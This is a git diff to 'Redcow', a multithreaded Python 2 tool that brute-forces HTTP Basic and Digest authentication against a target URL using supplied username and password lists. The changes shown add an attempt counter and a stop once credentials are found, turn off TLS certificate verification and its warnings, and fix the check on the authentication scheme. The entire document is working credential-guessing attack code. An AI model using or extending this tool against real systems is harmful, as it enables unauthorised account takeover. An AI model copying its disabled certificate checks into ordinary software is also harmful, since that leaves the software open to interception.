@@ -4,6 +4,7 @@ import requests
 import argparse
 import os.path
 import base64
+import ssl
 import sys
 import re
 
@@ -22,10 +23,12 @@ class Redcow(object):
         self.workers = workers
         self.auth_scheme = ''
         self.auth_realm = ''
+        self.cracked = False
+        self.attempt = 0
+
         self.__motd()
         self.__check_url()
         self.__load_creds()
-        self.cracked = False
 
         print "[>] Starting to attack authentication using %s threads...\n" % (str(self.workers))
 
@@ -36,19 +39,23 @@ class Redcow(object):
 
     def Worker(self):
         while True:
+            if self.cracked is True:
+                break
+
             if self.queueCreds.empty() is not True:
                 creds = self.queueCreds.get()
+                self.attempt += 1
 
-                msg = "\t[!] Attempting breach with: USER: \033[1m%15s\033[0m \t PASSWORD: \033[1m%15s\033[0m" % (creds["username"], creds["password"])
+                msg = "\t[!] Attempting breach with: USER: \033[1m%15s\033[0m \t PASSWORD: \033[1m%15s\033[0m ( Attempts: %s )" % (creds["username"], creds["password"], str(self.attempt))
                 sys.stdout.write('%s\r' % msg)
                 sys.stdout.flush()
                 sleep(0.025)
 
                 if self.auth_scheme == "basic":
-                    r = requests.get(self.url, auth=(creds["username"], creds["password"]))
+                    r = requests.get(self.url, auth=(creds["username"], creds["password"]), verify=False)
                     sleep(0.1)
                 elif self.auth_scheme == "digest":
-                    r = requests.get(self.url, auth=HTTPDigestAuth(creds["username"], creds["password"]))
+                    r = requests.get(self.url, auth=HTTPDigestAuth(creds["username"], creds["password"]), verify=False)
                     sleep(0.1)
 
                 if r.status_code == 200:
@@ -59,7 +66,7 @@ class Redcow(object):
                 else:
                     self.queueCreds.task_done()
                     del creds
-                    sleep(0.05)
+                    sleep(0.25)
             else:
                 sleep(0.5)
 
@@ -96,7 +103,7 @@ class Redcow(object):
         sys.stdout.write('%s\r' % msg)
         sys.stdout.flush()
         try:
-            r = requests.get(self.url, timeout=10)
+            r = requests.get(self.url, timeout=10, verify=False)
         except requests.exceptions.Timeout:
             msg = msg + "\033[91m\033[1mFAIL\033[0m"
             sys.stdout.write('%s\r' % msg)
@@ -122,7 +129,7 @@ class Redcow(object):
         self.auth_scheme = auth_group.group(1).lower()
         self.auth_realm = auth_group.group(2)
 
-        if not self.auth_scheme == 'basic' or not 'digest':
+        if self.auth_scheme != 'basic' and self.auth_scheme != 'digest':
             print "\n\t[ERROR] - \033[91mAuthentication Scheme not listed as '\033[1mBasic\033[0m' or '\033[1mDigest\033[0m'. Scheme not supported.\033[0m\n"
             sys.exit(1)
 
@@ -135,6 +142,7 @@ class Redcow(object):
         print "\t[INFO] \033[92m\033[1mHTTP_Authentication Scheme\033[0m: \033[1m%s\033[0m\n" % self.auth_scheme.capitalize()
 
 if __name__ == '__main__':
+    requests.packages.urllib3.disable_warnings()
     parser = argparse.ArgumentParser()
     auth_group = parser.add_argument_group("Required Arguments")
     auth_group.add_argument('-t', required="true", dest="target_url", help="Target URL running Web Authentication")
@@ -142,6 +150,7 @@ if __name__ == '__main__':
     auth_group.add_argument('-p', required="true", dest="passlist", help="A password *OR* a file containing a list of passwords")
     parser.add_argument('--threads', dest="threads", help="(Optional) Number of Threads to use. Default: 1")
     args = parser.parse_args()
+
 
     if not args.threads:
         args.threads = 1
@@ -151,12 +160,3 @@ if __name__ == '__main__':
 
     Moo = Redcow(args.target_url, args.userlist, args.passlist, args.threads)
     Moo.queueCreds.join()
-
-    while Moo.queueCreds.empty() != True:
-        sleep(0.5)
-    else:
-        if Moo.cracked is True:
-            sys.exit(0)
-        else:
-            print "\n\n[>] Sorry, the credentials provided did not work. Try again using different user/pass lists.\n"
-            sys.exit(0)
